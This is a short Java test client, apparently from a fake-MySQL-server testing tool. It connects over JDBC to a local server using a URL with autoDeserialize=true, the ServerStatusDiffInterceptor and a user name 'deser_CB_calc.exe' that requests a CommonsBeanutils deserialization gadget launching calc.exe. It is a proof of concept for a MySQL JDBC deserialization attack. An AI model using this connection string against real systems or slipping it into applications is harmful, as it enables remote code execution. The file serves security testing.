package me.n1ar4.fake.test.mysql8;

import java.sql.DriverManager;

public class MySQL8CB_S {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3308/test?" +
                "autoDeserialize=true&queryInterceptors=" +
                "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CB_calc.exe";
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
